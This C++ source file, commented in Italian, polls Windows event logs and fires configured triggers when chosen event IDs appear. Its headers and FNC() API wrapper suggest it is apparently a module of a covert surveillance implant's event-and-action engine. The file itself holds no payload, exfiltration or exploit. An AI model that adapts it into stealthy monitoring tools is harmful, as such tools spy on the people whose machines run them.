#include <Windows.h>
#include <json/JSON.h>
#include "../common.h"
#include "../bss.h"
#include "../H4-DLL.h"
#include "../SM_Core.h"
#include "../HM_SafeProcedures.h"
#include "../process.h"
#include "../AM_Core.h"
#include "../LOG.h"
#include "../SM_EventHandlers.h"

//---------------------------------------------------
// MONITOR DEGLI EVENTI WINDOWS
#define SAFE_CLOSE(x) { if(x) FNC(CloseEventLog)(x); x = 0; }

typedef struct {
	DWORD event_monitored;
	DWORD event_triggered;
	DWORD event_id;
} MONITORED_EVENT;

typedef struct {
	char* source_name;     // nome sorgente eventi
	HANDLE source_handle;  // handle sorgente eventi
	DWORD last_record_num; // numero di eventi presenti nella sorgente all'ultima lettura
	DWORD event_count;     // numero di eventi da monitorare per quella sorgente
	MONITORED_EVENT* event_array; // array degli eventi da monitorare con relative azioni
} MONITORED_SOURCE;

#define EM_ME_SLEEPTIME 300
#define EM_ME_BUFFER_SIZE 2048

HANDLE em_me_monevent_thread = 0;
DWORD em_me_source_count = 0;
MONITORED_SOURCE* em_me_source_table = NULL;

BOOL em_me_cp = FALSE;


// Thread di monitoring degli eventi
DWORD MonitorWindowsEvent(DWORD dummy)
{
	DWORD i, j, k, new_record_count, oldest_event;
	DWORD dwRead, dwNeeded;
	EVENTLOGRECORD* pevlr;
	BYTE bBuffer[EM_ME_BUFFER_SIZE];

	pevlr = (EVENTLOGRECORD*)&bBuffer;

	LOOP{
		CANCELLATION_POINT(em_me_cp);

	// Cicla fra le sorgenti
	for (i = 0; i < em_me_source_count; i++) {
		// Effettua il parsing dei nuovi eventi solo se l'handle alla sorgente e'
		// valido e se riesce a leggere il numero di eventi
		if (!em_me_source_table[i].source_handle ||
			!FNC(GetNumberOfEventLogRecords)(em_me_source_table[i].source_handle, &new_record_count) ||
			!FNC(GetOldestEventLogRecord)(em_me_source_table[i].source_handle, &oldest_event))
			continue;

		new_record_count += oldest_event;

		// Cicla fra i nuovi eventi presenti nella sorgente i-esima
		// (non consideriamo l'eventualita' in cui gli eventi possano essere cancellati 
		// selettivamente).
		for (j = em_me_source_table[i].last_record_num; j < new_record_count; j++) {
			// Se non riesce a leggere l'evento j-esimo, passa al successivo
			if (!FNC(ReadEventLogA)(em_me_source_table[i].source_handle, EVENTLOG_SEEK_READ | EVENTLOG_FORWARDS_READ,
							  j , bBuffer, EM_ME_BUFFER_SIZE, &dwRead, &dwNeeded)) {
				// Se non riesce a leggere potrebbe esserci stata una modifica al registro.
				// Allora prova a chiuderlo e a riaprirlo.
				SAFE_CLOSE(em_me_source_table[i].source_handle);
				em_me_source_table[i].source_handle = FNC(OpenEventLogA)(NULL, em_me_source_table[i].source_name);

				// Se fallisce la riapertura esce dal ciclo e non considera piu' la sorgente
				if (!em_me_source_table[i].source_handle)
					break;

				// Se fallisce la seconda lettura allora c'e' un errore di tipo diverso.
				if (!FNC(ReadEventLogA)(em_me_source_table[i].source_handle, EVENTLOG_SEEK_READ | EVENTLOG_FORWARDS_READ,
							  j , bBuffer, EM_ME_BUFFER_SIZE, &dwRead, &dwNeeded))
					continue;
			}

			// Cicla fra gli eventi da monitorare per la sorgente i-esima
			for (k = 0; k < em_me_source_table[i].event_count; k++)
				// Compara l'evento j-esimo nella sorgente con il k-esimo 
				// elemento da monitorare per quella sorgente
				if (pevlr->EventID == em_me_source_table[i].event_array[k].event_monitored) {
					TriggerEvent(em_me_source_table[i].event_array[k].event_triggered, em_me_source_table[i].event_array[k].event_id);
					break;
				}
		}

		// Aggiorna il numero di eventi per la sorgente
		em_me_source_table[i].last_record_num = new_record_count;
	}

	Sleep(EM_ME_SLEEPTIME);
	}
}


// Aggiunge un evento da monitorare a una sorgente
void MonEventAddEvent(MONITORED_SOURCE* source_entry, DWORD event_monitored, DWORD event_triggered, DWORD event_id)
{
	void* temp_table;

	// event_array e' inizializzato a 0 in EM_MonEventAdd
	// XXX...altro piccolo ed improbabile int overflow
	if (!(temp_table = realloc(source_entry->event_array, (source_entry->event_count + 1) * sizeof(MONITORED_EVENT))))
		return;

	source_entry->event_array = (MONITORED_EVENT*)temp_table;
	source_entry->event_array[source_entry->event_count].event_monitored = event_monitored;
	source_entry->event_array[source_entry->event_count].event_triggered = event_triggered;
	source_entry->event_array[source_entry->event_count].event_id = event_id;
	source_entry->event_count++;
}


void WINAPI EM_MonEventAdd(JSONObject conf_json, EVENT_PARAM* event_param, DWORD event_id)
{
	void* temp_table;
	char source_name[260];
	DWORD event_monitored;
	DWORD i;

	sprintf_s(source_name, "%S", conf_json[L"source"]->AsString().c_str());
	event_monitored = conf_json[L"id"]->AsNumber();

	// Se la sorgente e' gia' monitorata aggiunge un evento...
	for (i = 0; i < em_me_source_count; i++)
		if (!strcmp(em_me_source_table[i].source_name, source_name)) {
			MonEventAddEvent(em_me_source_table + i, event_monitored, event_param->start_action, event_id);
			return;
		}

	// ...altrimenti aggiunge la sorgente...
	// (XXX...altro piccolo ed improbabile int overflow)
	if (!(temp_table = realloc(em_me_source_table, (em_me_source_count + 1) * sizeof(MONITORED_SOURCE))))
		return;

	em_me_source_table = (MONITORED_SOURCE*)temp_table;
	em_me_source_table[em_me_source_count].event_count = 0;
	em_me_source_table[em_me_source_count].event_array = NULL;
	em_me_source_table[em_me_source_count].source_handle = 0;
	em_me_source_table[em_me_source_count].last_record_num = 0;
	em_me_source_table[em_me_source_count].source_name = _strdup(source_name);

	// ...e aggiunge l'evento...
	MonEventAddEvent(em_me_source_table + em_me_source_count, event_monitored, event_param->start_action, event_id);

	em_me_source_count++;
}


void WINAPI EM_MonEventStart()
{
	DWORD dummy, i, record_number, oldest_record;

	// Apre tutte le sorgenti da monitorare (verranno chiuse in EM_MonEventStop)
	// e inizializza il numero di eventi gia' presenti al momento dell'apertura
	for (i = 0; i < em_me_source_count; i++) {
		em_me_source_table[i].source_handle = FNC(OpenEventLogA)(NULL, em_me_source_table[i].source_name);
		if (em_me_source_table[i].source_handle &&
			FNC(GetNumberOfEventLogRecords)(em_me_source_table[i].source_handle, &record_number) &&
			FNC(GetOldestEventLogRecord)(em_me_source_table[i].source_handle, &oldest_record))
			em_me_source_table[i].last_record_num = record_number + oldest_record;
		else {
			// Se non riesce a leggere il numero di eventi chiude la sorgente e non 
			// la considera' piu'.
			em_me_source_table[i].last_record_num = 0;
			SAFE_CLOSE(em_me_source_table[i].source_handle);
		}
	}

	// Crea il thread solo se ci sono sorgenti da monitorare
	if (em_me_source_count > 0)
		em_me_monevent_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorWindowsEvent, NULL, 0, &dummy);
}


void WINAPI EM_MonEventStop()
{
	DWORD i;

	QUERY_CANCELLATION(em_me_monevent_thread, em_me_cp);

	// Libera tutte le strutture allocate
	for (i = 0; i < em_me_source_count; i++) {
		SAFE_FREE(em_me_source_table[i].source_name);
		SAFE_FREE(em_me_source_table[i].event_array);
		SAFE_CLOSE(em_me_source_table[i].source_handle);
	}
	SAFE_FREE(em_me_source_table);
	em_me_source_count = 0;
}

void EventMonitorLog::onStart()
{
	EM_MonEventStart();
}
void EventMonitorLog::onRun()
{
	DWORD j, k, new_record_count, oldest_event;
	DWORD dwRead, dwNeeded;
	EVENTLOGRECORD* pevlr;
	BYTE bBuffer[EM_ME_BUFFER_SIZE];

	pevlr = (EVENTLOGRECORD*)&bBuffer;

	// Cicla fra le sorgenti
	for (DWORD i = 0; i < em_me_source_count; i++) {
		// Effettua il parsing dei nuovi eventi solo se l'handle alla sorgente e'
		// valido e se riesce a leggere il numero di eventi
		if (!em_me_source_table[i].source_handle ||
			!FNC(GetNumberOfEventLogRecords)(em_me_source_table[i].source_handle, &new_record_count) ||
			!FNC(GetOldestEventLogRecord)(em_me_source_table[i].source_handle, &oldest_event))
			continue;

		new_record_count += oldest_event;

		// Cicla fra i nuovi eventi presenti nella sorgente i-esima
		// (non consideriamo l'eventualita' in cui gli eventi possano essere cancellati 
		// selettivamente).
		for (j = em_me_source_table[i].last_record_num; j < new_record_count; j++) {
			// Se non riesce a leggere l'evento j-esimo, passa al successivo
			if (!FNC(ReadEventLogA)(em_me_source_table[i].source_handle, EVENTLOG_SEEK_READ | EVENTLOG_FORWARDS_READ,
							  j , bBuffer, EM_ME_BUFFER_SIZE, &dwRead, &dwNeeded)) {
				// Se non riesce a leggere potrebbe esserci stata una modifica al registro.
				// Allora prova a chiuderlo e a riaprirlo.
				SAFE_CLOSE(em_me_source_table[i].source_handle);
				em_me_source_table[i].source_handle = FNC(OpenEventLogA)(NULL, em_me_source_table[i].source_name);

				// Se fallisce la riapertura esce dal ciclo e non considera piu' la sorgente
				if (!em_me_source_table[i].source_handle)
					break;

				// Se fallisce la seconda lettura allora c'e' un errore di tipo diverso.
				if (!FNC(ReadEventLogA)(em_me_source_table[i].source_handle, EVENTLOG_SEEK_READ | EVENTLOG_FORWARDS_READ,
							  j , bBuffer, EM_ME_BUFFER_SIZE, &dwRead, &dwNeeded))
					continue;
			}

			// Cicla fra gli eventi da monitorare per la sorgente i-esima
			for (k = 0; k < em_me_source_table[i].event_count; k++)
				// Compara l'evento j-esimo nella sorgente con il k-esimo 
				// elemento da monitorare per quella sorgente
				if (pevlr->EventID == em_me_source_table[i].event_array[k].event_monitored) {
					TriggerEvent(em_me_source_table[i].event_array[k].event_triggered, em_me_source_table[i].event_array[k].event_id);
					break;
				}
		}

		// Aggiorna il numero di eventi per la sorgente
		em_me_source_table[i].last_record_num = new_record_count;
	}
}

void EventMonitorLog::onStop()
{
	// Libera tutte le strutture allocate
	for (DWORD i = 0; i < em_me_source_count; i++) {
		SAFE_FREE(em_me_source_table[i].source_name);
		SAFE_FREE(em_me_source_table[i].event_array);
		SAFE_CLOSE(em_me_source_table[i].source_handle);
	}
	SAFE_FREE(em_me_source_table);
	em_me_source_count = 0;
}

void EventMonitorLog::onAdd(JSONObject json, EVENT_PARAM* event_param, DWORD event_id)
{
	EM_MonEventAdd(json, event_param, event_id);
}
